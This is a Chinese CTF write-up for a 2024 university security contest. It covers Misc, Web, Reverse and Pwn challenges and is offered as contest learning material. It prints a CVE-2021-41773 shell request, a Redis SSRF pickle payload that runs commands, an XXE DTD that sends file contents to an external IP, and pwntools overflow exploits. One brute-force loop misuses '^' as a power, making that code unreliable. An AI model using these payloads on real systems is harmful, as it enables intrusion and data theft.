---
title: "高校网络安全管理运维赛2024"
description: "高校网络安全管理运维赛2024 Writeup"

date: 2024-05-14T15:34:35+08:00
lastmod: 2025-11-10T16:55:40+08:00

math: true
mermaid: true

categories:
  - Writeup
tags:
  - CTF
---
<!--more-->

# Misc

## 签到

GIF 拆分 字符拼接

```txt
synt{guvf-vf-gur-fvtava-dhvm}

ROT13:
flag{this-is-the-signin-quiz}
```

## 钓鱼邮件识别

打开eml
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000987869-fef6e026-ab6e-48b6-9021-2bfaea76c5f7.png)
base64解码
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001044105-c0cd5507-856c-4be4-a5c6-81ae9cdd50b2.png)

### Flag1

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001095282-61c50ca4-113e-4166-a0dc-5e30556e66f1.png)

### Flag2

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001124983-548bb90b-03a6-43f9-944c-771e6b3d6a61.png)

### Flag3

第三段解析DNS的记录
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001261727-291d9bf4-b786-4932-a8df-dd9f00697bb6.png)
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001299780-c1782382-0fb4-4ca7-9251-c3cad35c76d0.png)
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001333207-14d79fb1-0bd1-4621-861c-02cc90060d10.png)

## easyshell

追踪流到倒数几个服务器流量解密发现如下
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001338674-b5b72b11-14fe-4801-bb12-512dbc2055c7.png)
pk头，是zip，保存成zip文件
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001645217-5d17990d-6c8c-4465-b275-35ea6f729738.png)
还发现了secret2.txt的内容
用上述txt，明文攻击zip
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001905837-864105ca-f4d3-4a3f-9c95-0245f0ea4213.png)
用明文攻击获取到的key直接解secret1.txt
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715002034550-435df7d3-1d87-4d19-bd0f-e9d58ffa7c59.png)
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715002091520-7cfff066-25f7-45f8-834b-e5bb657af9c1.png)

## SecretDB

用DB Browser for SQLite查看数据库，但是说flag不在这里
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715008667764-0af23da2-58f8-4414-81e6-ed0f8c87301c.png)
放到010中，发现这句话下面还藏着点东西，在01 0F之间有东西
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715008933494-3b65d672-7a46-4b52-ab2d-94c5abb2123a.png)
然后写脚本进行提取

```
with open('secret.db', 'rb') as f:
    c = f.read()

flag = {}
parts = c.split(b'\x01\x0f')

for i in parts[1:-2]:  # 修正切片范围
    flag[i[0]] = chr(i[1])

# 直接按照排序后的键值对打印结果
for k in sorted(flag.keys()):
    print(flag[k], end='')

# 或者使用下面的一行代码来替代上面的 for 循环
# print(''.join([flag[k] for k in sorted(flag.keys())]))
```

## Gateway

在附件中找到了密码，但还是编码的
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715006887010-6a828109-1d9a-441e-bc11-9f8886d24aea.png)
在题目附件里发现这个，联想到电信光猫的超密解密
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715009440301-bf91241e-f275-4c43-9729-fa66683d8488.png)
参考内容
[破解光猫超级管理员密码，也就是获取telecomadmin的密码](https://cloud.tencent.com/developer/article/2006614)
把里面的数字提取，然后三位数的内容把数字减掉4，从ASCII转字符即可，其他部分直接从ASCII转成字符即可，拼在一起

```
numbers = [106, 112, 101, 107, 127, 101, 104, 49, 57, 56, 53, 56, 54, 56, 49, 51, 51, 105, 56, 103, 106, 49, 56, 50, 56, 103, 102, 56, 52, 101, 104, 102, 105, 53, 101, 53, 102, 129]

decode = ''
for i in numbers:
    if i // 100 != 0:
        decode += chr(i - 4)    #三位数的按字母处理
    else:
        decode += chr(i)        #两位数的按数字处理
print(decode)
```


## Apache

- 源码：

```
from flask import Flask,request,send_file
import socket

app = Flask("webserver")

@app.route('/',methods=["GET"])
def index():
    return send_file(__file__)

@app.route('/nc',methods=["POST"])
def nc():
    try:
        dstport=int(request.form['port'])
        data=request.form['data']
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(('127.0.0.1', dstport))
        s.send(data.encode())
        recvdata = b''
        while True:
            chunk = s.recv(2048)
            if not chunk.strip():
                break
            else:
                recvdata += chunk
                continue
        return recvdata
    except Exception as e:
        return str(e)


app.run(host="0.0.0.0",port=8080,threaded=True)
```

CVE-2021-41773
[https://blog.csdn.net/luochen2436/article/details/120698682](https://blog.csdn.net/luochen2436/article/details/120698682)
payload:

```
port=80&data=POST%20%2fcgi-bin%2f.%252e%2f.%252e%2f.%252e%2f.%252e%2fbin%2fsh%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aAccept%3a%20*%2f*%0d%0aAccept-Language%3a%20zh-CN%2czh%3bq%3d0.8%2czh-TW%3bq%3d0.7%2czh-HK%3bq%3d0.5%2cen-US%3bq%3d0.3%2cen%3bq%3d0.2%0d%0aAccept-Encoding%3a%20gzip%2c%20deflate%0d%0aContent-Type%3a%20application%2fx-www-form-urlencoded%0d%0aCache%3a%20no-cache%0d%0aContent-Length%3a%2012%0d%0aConnection%3a%20close%0d%0a%0d%0aecho%3bcat%20%2ff*%0d%0a%0d%0a
```

## f or r

一层一层解压.cab文件，找到Cab for KB114514 PSFX，发现跟前两天的GeekCTF的题有点像
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000942707-a763ffbe-d4f5-490e-92f6-32bd3b39dfaa.png)
参考链接：
[https://qanux.github.io/2024/04/22/geek2024/index.html](https://qanux.github.io/2024/04/22/geek2024/index.html)
利用脚本进行更新
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000915845-57755e75-109f-4bcd-92d8-01649e10567f.png)
这里的o_curl.exe是当前自己系统的curl.exe，-o是要输出的文件名，r为回滚的，要把这个r里的解压出来的文件替换成自己系统的补丁里的，f里的是压缩包里的（事实上就这一个有用的）
出来个nnn.exe
自己系统补丁位置：
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000871074-f02c0e14-6dd7-4369-80b2-ab0fc49ce6d3.png)
大概就是在winsxs中搜索curl有关的文件（也可能不是这里边的，在其他补丁里，直接全局搜也行）
运行命令后得到最终输出的文件
看下版本
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000887771-38ef610f-f0f8-4119-a0cf-64d42a8e897f.png)
得到flag

## zip

nc后用队伍token连接
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994481062-c54c911c-25a6-4e4f-af53-dc48ae968a09.png)
源码main函数分析

```
int main(int argc, char *argv[]) {
    load();
    system("7z");

    puts("your token:");//输入token
    fflush(stdout);
    fgets(buf, sizeof(buf), stdin);
    if (cmpstr(token, buf)) {//进行校验
        puts("wrong token!");
        return 1;
    }

    zip(buf);//压缩文件

    puts("your flag:");
    fflush(stdout);

    fgets(buf, sizeof(buf), stdin);
    if (cmpstr("flag{", buf)) {//进行校验
        puts("wrong flag!");
        return 1;
    }

    unzip(buf);//解压

    FILE *f = fopen("flag.txt", "r");
    if (!f) {
        puts("flag.txt not found");
        return 1;
    }
    fgets(buf, sizeof(buf), f);
    fclose(f);

    printf("flag: %s\n", buf);

    return 0;
}
```

连接后
1.先比较token
2.然后用token做密码去压缩
3.要用以“flag{”开头的字符串
4.得到解压的flag
其中
token在处理时，在第65置0，所以就要token的前64位
3步中要绕过flag{，可以通过传DEL（ASCII:127）删除
payload

```
from pwn import *

p = remote('prob03.contest.pku.edu.cn', 10003, level = 'debug')
p.sendlineafter(b'Please input your token: ',
                b'468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl')#

p.sendlineafter(b'your token:\n', b'468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy')

payload = b'flag{'+b'\x7f'*5+b"468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy"
p.sendlineafter(b'your flag:\n', payload)

p.interactive()

```

# Web

## phpsql

注册admin显示已经存在

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714992887587-02327559-9444-4a1a-a1f9-dd0e928c598d.png)

结合题目phpsql应该是万能密码注入进入后台
直接拿sql语句字典跑

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993045758-5d5a39af-821d-4573-92f8-1acbce11c6f0.png)

直接跑进去

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993089174-839db6d3-1ae0-4e02-aa7d-90c465139d17.png)

## pyssrf

根据题目与提示pyssrf加什么年代了还用python3.7.1
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994494037-64fd117e-7f50-497c-adde-f2b742683b6e.png)
python3.7.1的环境中,urllib有请求头注入
redis 解析
GET /?
payload
padding
基本上可以理解为
pickle反序列化+redis+rce+ssrf

```
import base64
import hashlib
opcode='''(S'mkdir ./static;cp /flag ./static/f'
ios
system
.'''.encode('utf-8')
key=hashlib.md5("http://test/".encode()).hexdigest()
value=base64.b64encode(opcode).decode('utf-8')
print('set',key,value)
```

得到

```
set 0439e1ff2e65e21dcf4bba4c26a0dab2 KFMnbWtkaXIgLi9zdGF0aWM7Y3AgL2ZsYWcgLi9zdGF0aWMvZicKaW9zCnN5c3RlbQou
```

构造url

```
?url=127.0.0.1:6379?%0d%0aset%200439e1ff2e65e21dcf4bba4c26a0dab2%20KFMnbWtkaXIgLi9zdGF0aWM7Y3AgL2ZsYWcgLi9zdGF0aWMvZicKaW9zCnN5c3RlbQou%0d%0apadding%0d%0a
```

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994544337-8fb892d3-eb1f-4eb6-8519-8009cbc7f922.png)

```
?url=test/
```

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994558947-f9549518-8176-46fa-8351-57e63ed42029.png)

```
/static/f
```

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994569753-437c68fe-8887-4069-b2da-66a5ce52d809.png)
打开即可得到flag
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994749430-228bc4a8-970d-4ba2-be9e-40588181af13.png)

## fileit

源码有提示
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993406997-f9ee5e83-dd7b-4205-b62b-96a9dc140d30.png)
测试后发现要打无回显xxe
vps创建flag.dtd文件，内容如下：

```
<!ENTITY % ccc "<!ENTITY &#x25; aba SYSTEM 'http://43.143.167.75:8888?x=%file;'>">
%ccc;
%aba;
```

创建完成后，在当前目录起python服务
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993610279-870a1647-d25a-4e40-bb49-5c79545d395b.png)
payload如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY % xxe SYSTEM "http://43.143.167.75:8888/flag.dtd">
    %xxe;
    ]>
```

初始页面抓包后，post传参：
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993694538-4c066cf9-fdf1-4797-8480-57b979fc7e14.png)
发送后，vps就会显示接收的数据
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993724668-023b3aaa-ce9d-4493-bc71-bba222e1d145.png)
base64解码，拿到flag
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993743242-9254f3fc-1ecb-4b04-b0cf-c98c234f8510.png)

# Reverse

## ezayre

64位无壳elf，拉进ida看看
![](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765706-a3095736-a5b7-47ba-b23d-866b730cb950.png)
锁定主要函数是sub_1208，跟进之后有爆红，修好之后加密逻辑如下，看到下图标红处之后，感觉是base64
![](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765742-1cdb534e-27d7-4cc4-bd45-aa83c1012e4d.png)
直接查找一下字符串
![](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765707-401ce508-7aea-4897-b4c8-b0654fdb8d8e.png)
看见变表和密文之后直接秒了
![](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765583-e9e645b8-9ff4-46fd-9c35-39f31dbd8769.png)

## babyre

正常脱upx壳之后拉进ida
![](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765670-b0ad82b2-4f5e-497d-a3c4-2ece25075536.png)
直接把四个函数中的加密逆一下，都是一些基本加密操作，直接爆破一下，注意爆破的取值区间是0~2^32-1,包含所有32无符号整数，把内容合一下，exp如下（PS:第一个函数就加减值加密，不写入函数了就)

```
#include <stdio.h>

__int64 __fastcall sub_1257(int a1)
{
  __int64 result; // rax

  if ( (a1 | 0x8E03BEC3) - 3 * (a1 & 0x71FC413C) + a1 == -1876131848 )
    result = 0LL;
  else
    result = 0xFFFFFFFFLL;
  return result;
}

__int64 __fastcall sub_12A4(unsigned int a1)
{
  if ( a1 > 0x10000000 )
    return 0xFFFFFFFFLL;
  if ( 4 * ((~a1 & 0xA8453437) + 2 * ~(~a1 | 0xA8453437))
     + -3 * (~a1 | 0xA8453437)
     + 3 * ~(a1 | 0xA8453437)
     - (-10 * (a1 & 0xA8453437)
      + (a1 ^ 0xA8453437)) == 551387557 )
    return 0LL;
  return 0xFFFFFFFFLL;
}


__int64 __fastcall sub_1346(unsigned int a1)
{
  if ( a1 > 0x10000000 )
    return 0xFFFFFFFFLL;
  if ( 11 * ~(a1 ^ 0xE33B67BD)
     + 4 * ~(~a1 | 0xE33B67BD)
     - (6 * (a1 & 0xE33B67BD)
      + 12 * ~(a1 | 0xE33B67BD))
     + 3 * (a1 & 0xD2C7FC0C)
     + -5 * a1
     - 2 * ~(a1 | 0xD2C7FC0C)
     + ~(a1 | 0x2D3803F3)
     + 4 * (a1 & 0x2D3803F3)
     - -2 * (a1 | 0x2D3803F3) == 0xCE1066DC )
    return 0LL;
  return 0xFFFFFFFFLL;
}

int main()
{
	printf("flag{");

	unsigned int a = 0xADB1D018LL;
	unsigned int b = a+0x36145344;
	printf("%08x",b);
	
	printf("-");
	
	
	for(unsigned int i=0;i<2^32 - 1;i++)
	{
		unsigned int bbq = sub_1257(i);
		if(bbq==0LL)
		{
			printf("%08x",i);
			break;
		}
	}
	
	printf("-");
	
	for(unsigned int i=0;i<2^32 - 1;i++)
	{
		unsigned int bbq = sub_12A4(i);
		if(bbq==0LL)
		{
			printf("%08x",i);
			break;
		}
	}
	
	printf("-");
	
	for(unsigned int i=0;i<2^32 - 1;i++)
	{
		unsigned int bbq = sub_1346(i);
		if(bbq==0LL)
		{
			printf("%08x",i);
			break;
		}
	}
	printf("}");
	return 0;
}
//flag{e3c6235c-05d9434d-04b1edf3-04034083}
```

# Pwn

## babypwn

- ret2text

```
from pwn import *

p = remote('prob07.contest.pku.edu.cn', 10007)

p.recvuntil(b'Please input your token: ')
p.sendline(b'468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl')
p.recvuntil(b'Enter your username: ')
p.sendline(b'root')

x = b'!@#$%^&*()_+'
offset=0x38 - len(x)
payload = x + b'\x00' * offset + p64(0x40117A)
p.recvuntil(b'Enter the password: ')
p.sendline(payload)

p.interactive()
```

## Login

密码处输入字符过长溢出，密码自己出来了
![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714996681718-deba3f05-beb0-4cd5-9e82-68eaecfb43a3.png)
elf文件泄露，使用脚本提取

```
from pwn import *

p = remote('prob04.contest.pku.edu.cn', 10004, level = 'debug')
p.sendlineafter(b'Please input your token: ',
                b'468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl')

p.sendlineafter(b'Username:', b'admin')

p.sendlineafter(b'Password:', b'1q2w3e4r')

data = p.recvall()
flag = data.find(b'\x7fELF')
if flag ==-1:
    datas = data
else:
    datas = data[flag:]

with open('a','wb') as f:
    f.write(datas)

p.interactive()
```

提取成功，找到后门
![798c4c64bc527cfdfb112297a2aba3a.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714996795308-bf233b5b-65dd-4af5-b558-fe74bf5ea687.png)
找gadgets
![439b7b4556526a0ec73c101ae0b03e5b_.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714996814489-e62ce271-ef49-48db-b399-d15b31f702e4.png)

- exp

```
from pwn import *

p = remote('prob04.contest.pku.edu.cn', 10004, level='debug')
p.sendlineafter(b'Please input your token: ',
                b'468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl')
p.sendlineafter(b'Username: ', 'admin')

'''
Gadgets information
============================================================
0x000000000040101a : ret
0x0000000000401359 : ret 0x1be
'''
payload = b'a' * 40 + b'\x00' * (41 - 40) + b'b' * (48 + 96 - 41) + p64(0x40101a) * 3 + p64(0x40127e)

p.sendlineafter(b'Password: ', payload)

p.interactive()

```

![image.png](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714998007875-ba0fadb1-4b37-4774-988e-40dc7a35e266.png)

